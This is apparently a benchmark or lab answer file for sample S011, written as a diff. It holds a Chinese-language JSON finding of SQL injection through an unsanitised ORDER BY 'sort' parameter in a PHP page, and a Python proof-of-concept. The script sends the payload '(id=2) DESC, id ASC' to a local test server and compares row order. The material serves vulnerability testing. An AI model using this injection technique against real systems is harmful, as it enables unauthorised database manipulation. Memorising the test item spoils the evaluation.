@@ -1,0 +1,81 @@
+```json
+{
+  "sample_id": "S011",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0008", "F01:0013", "F01:0015", "F01:0037"],
+  "evidence": {
+    "source": "F01:0008 从 $_GET['sort'] 读取外部输入并经 trim 存入 $sort；F01:0009-0011 仅在空值时回退为 id。",
+    "flow": "F01:0013 将 $sort 直接拼入 SELECT id, name FROM lab_people ORDER BY $sort；F01:0015 调用 $db->query($sql) 执行。",
+    "guard": "无效：F01:0008-0011 只有 trim 和空值默认，没有字段白名单、类型约束或排序表达式限制；ORDER BY 结构部分未做参数绑定；F01:0037 的 htmlspecialchars 只保护 HTML 输出，不防护 SQL。",
+    "sink": "F01:0015 $db->query($sql) 是实际 SQL 执行点。"
+  },
+  "prerequisites": [
+    "Web 服务在 127.0.0.1:4280 提供 F01 页面，且 GET 参数 sort 可到达 F01:0008。",
+    "bootstrap.php 已成功建立 mysqli 连接，数据库账号对 lab_people 至少有 SELECT 权限。",
+    "lab_people 表结构与预置数据符合上下文：id INT 主键，name VARCHAR，数据为 1 Alice、2 Bob、3 Carol。",
+    "查询错误仅写日志不回显，因此验证依据可预测的排序结果变化，而不依赖数据库错误或 HTTP 200。"
+  ],
+  "missing_context": [
+    "bootstrap.php 未包含在输入包中，无法核对连接初始化、数据库名和权限细节；POC 仅依赖已部署页面。",
+    "输入包未给出具体部署路径，仅给出 127.0.0.1:4280；脚本默认入口为根路径 /，若实际入口文件不同，需要仅调整路径而保持主机端口不变。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "将脚本保存为 poc_s011.py 并运行 python3 poc_s011.py；脚本只请求 http://127.0.0.1:4280/ 的 GET sort 参数，不修改数据。普通对照：sort=id，预期解析到 [(1, Alice), (2, Bob), (3, Carol)]。测试输入：sort=(id=2) DESC, id ASC，预期解析到 [(2, Bob), (1, Alice), (3, Carol)]，即 Bob 被排序到第一行，证明外部输入改变了 ORDER BY 的 SQL 结构。成功条件是两次解析结果分别匹配预期且测试结果不同于普通结果，不能用 HTTP 200 作为成功条件。失败时检查：127.0.0.1:4280 是否提供该页面、入口路径是否为根路径、bootstrap.php 是否连接 MariaDB、账号是否有 lab_people 的 SELECT 权限、种子数据是否为 1 Alice/2 Bob/3 Carol、页面输出是否仍为 li 列表格式、是否被 WAF 或额外过滤拦截。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import html
+import re
+import sys
+import urllib.parse
+import urllib.request
+
+BASE_URL = "http://127.0.0.1:4280/"
+PARAM = "sort"
+
+
+def fetch_rows(sort_value):
+    query = urllib.parse.urlencode({PARAM: sort_value})
+    url = BASE_URL + "?" + query
+    req = urllib.request.Request(url, headers={"User-Agent": "S011-local-poc"})
+    with urllib.request.urlopen(req, timeout=5) as resp:
+        body = resp.read().decode("utf-8", "replace")
+
+    rows = []
+    for match in re.finditer(r"<li>(.*?)：\s*(.*?)</li>", body, re.S):
+        id_text = html.unescape(re.sub(r"<[^>]+>", "", match.group(1))).strip()
+        name_text = html.unescape(re.sub(r"<[^>]+>", "", match.group(2))).strip()
+        try:
+            rows.append((int(id_text), name_text))
+        except ValueError:
+            pass
+    return rows
+
+
+def main():
+    expected_normal = [(1, "Alice"), (2, "Bob"), (3, "Carol")]
+    expected_test = [(2, "Bob"), (1, "Alice"), (3, "Carol")]
+
+    normal = fetch_rows("id")
+    test = fetch_rows("(id=2) DESC, id ASC")
+
+    print("normal sort=id:", normal)
+    print("test sort=(id=2) DESC, id ASC:", test)
+
+    if normal == expected_normal and test == expected_test and test != normal:
+        print("OBSERVED: ORDER BY expression changed row order; SQL structure injection reachable.")
+        return 0
+
+    print("FAILED: expected normal=", expected_normal)
+    print("FAILED: expected test=", expected_test)
+    print("Check 127.0.0.1:4280 endpoint path, bootstrap.php DB connection, SELECT privilege, seed data, HTML output format, and any extra filter/WAF.")
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
